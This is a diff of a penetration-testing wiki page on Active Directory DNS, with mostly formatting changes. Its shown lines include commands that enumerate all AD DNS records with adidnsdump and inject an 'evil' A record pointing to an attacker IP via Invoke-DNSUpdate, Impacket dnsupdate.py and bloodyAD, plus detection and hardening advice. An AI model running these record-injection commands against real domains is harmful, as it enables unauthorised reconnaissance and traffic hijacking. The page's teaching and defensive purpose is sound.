@@ -1,9 +1,8 @@
 # AD DNS Records
 
-
 By default **any user** in Active Directory can **enumerate all DNS records** in the Domain or Forest DNS zones, similar to a zone transfer (users can list the child objects of a DNS zone in an AD environment).
 
-The tool [[https://github.com/dirkjanm/adidnsdump|**adidnsdump**]] enables **enumeration** and **exporting** of **all DNS records** in the zone for recon purposes of internal networks.
+The tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) enables **enumeration** and **exporting** of **all DNS records** in the zone for recon purposes of internal networks.
 
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
@@ -21,10 +20,10 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 
 cat records.csv
 ```
-```
+
 >  adidnsdump v1.4.0 (April 2025) adds JSON/Greppable (`--json`) output, multi-threaded DNS resolution and support for TLS 1.2/1.3 when binding to LDAPS  
 
-For more information read [[https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/|https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/]]
+For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
 
 ---
 
@@ -43,14 +42,14 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose
 # Delete it when done
 Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 ```
-```
+
 ### Impacket – dnsupdate.py  (Python)
 
 ```bash
 # add/replace an A record via secure dynamic-update
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
-```
+
 *(dnsupdate.py ships with Impacket ≥0.12.0)*
 
 ### BloodyAD
@@ -58,7 +57,7 @@ python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -
 ```bash
 bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
 ```
-```
+
 ---
 
 ## Common attack primitives
@@ -78,7 +77,6 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 * Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
 * Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
 * Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.  
-
 
 ## References
 
